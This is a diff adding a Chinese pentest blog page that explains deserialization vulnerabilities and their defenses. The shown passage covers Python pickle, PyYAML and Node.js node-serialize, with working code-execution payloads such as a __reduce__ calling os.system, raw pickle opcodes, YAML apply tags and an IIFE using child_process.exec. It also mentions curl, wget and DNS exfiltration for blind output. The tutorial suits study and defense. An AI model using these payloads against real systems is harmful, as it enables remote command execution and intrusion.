@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="前言反序列化漏洞是渗透测试中极具杀伤力的一类安全问题。攻击者通过构造恶意的序列化数据，在目标应用进行反序列化时触发任意代码执行、权限提升或敏感信息泄露。本文聚焦Python与Node.js两大生态中的常见反序列化攻击面，兼顾Ruby Marshal与.NET BinaryFormatter，系统梳理其原理、利用链与实战技巧。 一、反序列化漏洞的本质序列化的本质是将运行时的对象状态转换为可存储或可传">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Python与Node.js反序列化漏洞">
+<meta property="og:url" content="https://congliang.github.io/Deserialization-python-node/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="前言反序列化漏洞是渗透测试中极具杀伤力的一类安全问题。攻击者通过构造恶意的序列化数据，在目标应用进行反序列化时触发任意代码执行、权限提升或敏感信息泄露。本文聚焦Python与Node.js两大生态中的常见反序列化攻击面，兼顾Ruby Marshal与.NET BinaryFormatter，系统梳理其原理、利用链与实战技巧。 一、反序列化漏洞的本质序列化的本质是将运行时的对象状态转换为可存储或可传">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-06-15T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:34:45.863Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/Deserialization-python-node/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/Deserialization-python-node/","path":"Deserialization-python-node/","title":"Python与Node.js反序列化漏洞"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Python与Node.js反序列化漏洞 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%9C%AC%E8%B4%A8"><span class="nav-number">2.</span> <span class="nav-text">一、反序列化漏洞的本质</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81Python-Pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">3.</span> <span class="nav-text">二、Python Pickle 反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-Pickle-%E5%8D%8F%E8%AE%AE%E6%A6%82%E8%BF%B0"><span class="nav-number">3.1.</span> <span class="nav-text">2.1 Pickle 协议概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-reduce-%E6%96%B9%E6%B3%95%E5%88%A9%E7%94%A8"><span class="nav-number">3.2.</span> <span class="nav-text">2.2 reduce 方法利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-%E6%89%8B%E5%B7%A5%E6%9E%84%E9%80%A0Pickle-Opcode"><span class="nav-number">3.3.</span> <span class="nav-text">2.3 手工构造Pickle Opcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-%E5%AE%9E%E6%88%98%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="nav-number">3.4.</span> <span class="nav-text">2.4 实战注意事项</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-5-%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD"><span class="nav-number">3.5.</span> <span class="nav-text">2.5 防护措施</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81PyYAML-%E4%B8%8D%E5%AE%89%E5%85%A8%E5%8A%A0%E8%BD%BD"><span class="nav-number">4.</span> <span class="nav-text">三、PyYAML 不安全加载</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-YAML-%E4%B8%8E-PyYAML"><span class="nav-number">4.1.</span> <span class="nav-text">3.1 YAML 与 PyYAML</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="nav-number">4.2.</span> <span class="nav-text">3.2 利用原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81"><span class="nav-number">4.3.</span> <span class="nav-text">3.3 利用代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-4-PyYAML-CVE-%E7%BB%8F%E5%85%B8%E6%A1%88%E4%BE%8B"><span class="nav-number">4.4.</span> <span class="nav-text">3.4 PyYAML CVE 经典案例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-5-%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD"><span class="nav-number">4.5.</span> <span class="nav-text">3.5 防护措施</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81Node-js-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">5.</span> <span class="nav-text">四、Node.js 反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-node-serialize-%E4%B8%8E-IIFE"><span class="nav-number">5.1.</span> <span class="nav-text">4.1 node-serialize 与 IIFE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-%E6%9B%B4%E5%8D%B1%E9%99%A9%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%BA%93"><span class="nav-number">5.2.</span> <span class="nav-text">4.2 更危险的反序列化库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-3-js-yaml-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE"><span class="nav-number">5.3.</span> <span class="nav-text">4.3 js-yaml 反序列化RCE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-4-Node-js-%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD"><span class="nav-number">5.4.</span> <span class="nav-text">4.4 Node.js 防护措施</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81Ruby-Marshal-load-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">6.</span> <span class="nav-text">五、Ruby Marshal.load 反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-Marshal-%E7%AE%80%E4%BB%8B"><span class="nav-number">6.1.</span> <span class="nav-text">5.1 Marshal 简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-%E5%88%A9%E7%94%A8%E9%93%BE"><span class="nav-number">6.2.</span> <span class="nav-text">5.2 利用链</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-3-%E7%BB%8F%E5%85%B8-Gadget-Chain"><span class="nav-number">6.3.</span> <span class="nav-text">5.3 经典 Gadget Chain</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-4-%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD"><span class="nav-number">6.4.</span> <span class="nav-text">5.4 防护措施</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81-NET-BinaryFormatter-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">7.</span> <span class="nav-text">六、.NET BinaryFormatter 反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#6-1-%E6%9C%BA%E5%88%B6%E6%A6%82%E8%BF%B0"><span class="nav-number">7.1.</span> <span class="nav-text">6.1 机制概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-2-%E5%B8%B8%E8%A7%81Gadget%E7%B1%BB%E5%9E%8B"><span class="nav-number">7.2.</span> <span class="nav-text">6.2 常见Gadget类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-3-%E5%88%A9%E7%94%A8%E7%A4%BA%E4%BE%8B%EF%BC%88ysoserial-net%EF%BC%89"><span class="nav-number">7.3.</span> <span class="nav-text">6.3 利用示例（ysoserial.net）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-4-%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD"><span class="nav-number">7.4.</span> <span class="nav-text">6.4 防护措施</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E3%80%81%E5%A4%9A%E8%AF%AD%E8%A8%80%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%B9%E6%AF%94"><span class="nav-number">8.</span> <span class="nav-text">七、多语言反序列化对比</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AB%E3%80%81%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="nav-number">9.</span> <span class="nav-text">八、实战利用思路</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#8-1-%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E5%85%A5%E5%8F%A3"><span class="nav-number">9.1.</span> <span class="nav-text">8.1 常见攻击入口</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-2-%E6%97%A0%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7"><span class="nav-number">9.2.</span> <span class="nav-text">8.2 无回显利用技巧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-3-%E9%98%B2%E5%BE%A1%E7%BB%95%E8%BF%87"><span class="nav-number">9.3.</span> <span class="nav-text">8.3 防御绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B9%9D%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B8%85%E5%8D%95"><span class="nav-number">10.</span> <span class="nav-text">九、渗透测试清单</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"><span class="nav-number">11.</span> <span class="nav-text">免责声明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-number">12.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Deserialization-python-node/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Python与Node.js反序列化漏洞 | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Python与Node.js反序列化漏洞
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-06-15 08:00:00" itemprop="dateCreated datePublished" datetime="2026-06-15T08:00:00+08:00">2026-06-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>反序列化漏洞是渗透测试中极具杀伤力的一类安全问题。攻击者通过构造恶意的序列化数据，在目标应用进行反序列化时触发任意代码执行、权限提升或敏感信息泄露。本文聚焦Python与Node.js两大生态中的常见反序列化攻击面，兼顾Ruby Marshal与.NET BinaryFormatter，系统梳理其原理、利用链与实战技巧。</p>
+<h2 id="一、反序列化漏洞的本质"><a href="#一、反序列化漏洞的本质" class="headerlink" title="一、反序列化漏洞的本质"></a>一、反序列化漏洞的本质</h2><p>序列化的本质是将运行时的对象状态转换为可存储或可传输的字节流；反序列化则是其逆过程，将字节流还原为内存中的对象。问题出在”还原”这一步——如果反序列化过程不限制可实例化的类型，攻击者就能注入精心构造的对象，在对象重建阶段触发危险操作。</p>
+<p>大部分面向对象语言都提供了一种”魔法方法”机制——对象在反序列化重建时自动调用的回调函数。攻击者的核心思路就是控制这些回调的输入，使其执行系统命令、读写文件或发起网络连接。</p>
+<h2 id="二、Python-Pickle-反序列化"><a href="#二、Python-Pickle-反序列化" class="headerlink" title="二、Python Pickle 反序列化"></a>二、Python Pickle 反序列化</h2><h3 id="2-1-Pickle-协议概述"><a href="#2-1-Pickle-协议概述" class="headerlink" title="2.1 Pickle 协议概述"></a>2.1 Pickle 协议概述</h3><p><code>pickle</code> 是Python标准库中的序列化模块，支持几乎所有Python对象的序列化与反序列化。它采用一套基于栈的虚拟机指令集（opcode），序列化的过程就是生成这些opcode的过程，反序列化则是逐条执行opcode。</p>
+<p>Pickle协议共有6个版本（0-5），高版本在效率和功能上有所增强，但核心机制不变。</p>
+<h3 id="2-2-reduce-方法利用"><a href="#2-2-reduce-方法利用" class="headerlink" title="2.2 reduce 方法利用"></a>2.2 <strong>reduce</strong> 方法利用</h3><p><code>pickle</code> 在反序列化对象时会查找类的 <code>__reduce__</code> 方法。该方法返回一个元组 <code>(callable, args)</code>，pickle引擎会执行 <code>callable(*args)</code> 来重建对象。攻击者可以构造一个类，使其 <code>__reduce__</code> 方法返回 <code>(os.system, (&#39;whoami&#39;,))</code>，从而实现命令执行。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 返回 (callable, args)</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">&#x27;whoami&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">payload = pickle.dumps(Exploit())</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(payload).decode())</span><br></pre></td></tr></table></figure>
+
+<p>实际利用中更常用 <code>__reduce_ex__</code>，它比 <code>__reduce__</code> 优先级更高。许多第三方库会在反序列化过程中调用被还原对象上的方法，这为构造更复杂的利用链（gadget chain）提供了可能。</p>
+<h3 id="2-3-手工构造Pickle-Opcode"><a href="#2-3-手工构造Pickle-Opcode" class="headerlink" title="2.3 手工构造Pickle Opcode"></a>2.3 手工构造Pickle Opcode</h3><p>除了利用 <code>__reduce__</code>，攻击者还可以直接编写pickle opcode。以下opcode序列等价于执行 <code>os.system(&#39;whoami&#39;)</code>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">opcode = <span class="string">b&quot;&quot;&quot;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tR.&quot;&quot;&quot;</span></span><br><span class="line">pickle.loads(opcode)</span><br></pre></td></tr></table></figure>
+
+<p>各指令含义：</p>
+<ul>
+<li><code>c</code>：导入模块和函数（<code>os.system</code>）</li>
+<li><code>(</code>：将字符串压入栈</li>
+<li><code>t</code>：从栈中弹出元组元素构建元组</li>
+<li><code>R</code>：调用栈顶的可调用对象，传入次栈顶的元组作为参数</li>
+<li><code>.</code>：结束</li>
+</ul>
+<h3 id="2-4-实战注意事项"><a href="#2-4-实战注意事项" class="headerlink" title="2.4 实战注意事项"></a>2.4 实战注意事项</h3><ul>
+<li><strong>协议版本</strong>：<code>pickle.dumps</code> 默认使用协议3（Python 3），需注意目标Python版本</li>
+<li><strong>Windows vs Linux</strong>：命令执行payload需根据目标操作系统调整</li>
+<li><strong>回显问题</strong>：无回显时可使用 <code>curl</code>、<code>wget</code>、DNS外带等方式获取命令输出</li>
+<li><strong>沙箱环境</strong>：部分环境限制 <code>os.system</code>，可尝试 <code>subprocess</code>、<code>pty.spawn</code> 等替代</li>
+</ul>
+<h3 id="2-5-防护措施"><a href="#2-5-防护措施" class="headerlink" title="2.5 防护措施"></a>2.5 防护措施</h3><ul>
+<li><strong>绝对不要对不可信数据调用 <code>pickle.loads</code></strong>——这是唯一的根本解决方案</li>
+<li>如果必须使用，考虑使用 <code>pickle.Unpickler.find_class</code> 进行白名单校验</li>
+<li>使用安全的序列化格式替代，如 JSON（仅支持基本类型）</li>
+<li>在沙箱或隔离环境中执行反序列化操作</li>
+</ul>
+<h2 id="三、PyYAML-不安全加载"><a href="#三、PyYAML-不安全加载" class="headerlink" title="三、PyYAML 不安全加载"></a>三、PyYAML 不安全加载</h2><h3 id="3-1-YAML-与-PyYAML"><a href="#3-1-YAML-与-PyYAML" class="headerlink" title="3.1 YAML 与 PyYAML"></a>3.1 YAML 与 PyYAML</h3><p>YAML是常用的配置文件格式，PyYAML是Python生态中最流行的YAML解析库。<code>yaml.load()</code> 函数默认支持解析并实例化任意Python对象——这个”特性”使其成为反序列化攻击的重要入口。</p>
+<h3 id="3-2-利用原理"><a href="#3-2-利用原理" class="headerlink" title="3.2 利用原理"></a>3.2 利用原理</h3><p>YAML规范允许通过标签 <code>!!python/object</code> 指定要实例化的Python类。PyYAML在 <code>yaml.load()</code>（注意，不是 <code>safe_load</code>）中会解析这些标签并执行对象构造：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!python/object/apply:os.system</span> [<span class="string">&quot;whoami&quot;</span>]</span><br></pre></td></tr></table></figure>
+
+<p>或者更复杂的写法：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!python/object/apply:subprocess.check_output</span> [[<span class="string">&quot;whoami&quot;</span>]]</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-3-利用代码"><a href="#3-3-利用代码" class="headerlink" title="3.3 利用代码"></a>3.3 利用代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">!!python/object/apply:os.system [&quot;whoami&quot;]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 危险：会执行系统命令</span></span><br><span class="line">yaml.load(payload, Loader=yaml.Loader)</span><br></pre></td></tr></table></figure>
+
+<p>Python 3.6之后 <code>yaml.load()</code> 默认使用 <code>SafeLoader</code>，需要显式传入 <code>Loader=yaml.Loader</code> 才能触发。但在许多遗留代码和教程中，开发者仍在传递不安全的Loader参数。</p>
+<h3 id="3-4-PyYAML-CVE-经典案例"><a href="#3-4-PyYAML-CVE-经典案例" class="headerlink" title="3.4 PyYAML CVE 经典案例"></a>3.4 PyYAML CVE 经典案例</h3><ul>
+<li><strong>CVE-2017-18342</strong>：<code>yaml.load()</code> 在未指定Loader时可触发任意代码执行</li>
+<li><strong>CVE-2020-1747</strong>：PyYAML <code>FullLoader</code> 同样可被利用</li>
+</ul>
+<h3 id="3-5-防护措施"><a href="#3-5-防护措施" class="headerlink" title="3.5 防护措施"></a>3.5 防护措施</h3><ul>
+<li>强制使用 <code>yaml.safe_load()</code> 或 <code>yaml.load(..., Loader=yaml.SafeLoader)</code></li>
+<li>在CI&#x2F;CD中加入安全Lint规则（如bandit）检测 <code>yaml.load</code> 调用</li>
+<li>评估是否可以用 <code>json</code>、<code>toml</code> 等更安全的格式替代YAML</li>
+</ul>
+<h2 id="四、Node-js-反序列化"><a href="#四、Node-js-反序列化" class="headerlink" title="四、Node.js 反序列化"></a>四、Node.js 反序列化</h2><h3 id="4-1-node-serialize-与-IIFE"><a href="#4-1-node-serialize-与-IIFE" class="headerlink" title="4.1 node-serialize 与 IIFE"></a>4.1 node-serialize 与 IIFE</h3><p><code>node-serialize</code> 是一个npm包，提供类似PHP <code>serialize</code> 的序列化功能。其 <code>unserialize()</code> 方法会将序列化字符串中的函数体直接通过 <code>eval</code> 执行。</p>
+<p>默认情况下 <code>eval</code> 不能直接执行函数声明，因此攻击载荷通常包装在**立即执行函数表达式（IIFE）**中：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 攻击载荷结构</span></span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;whoami&#x27;</span>, <span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(stdout);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
+
+<p>完整序列化后的payload示例：</p>
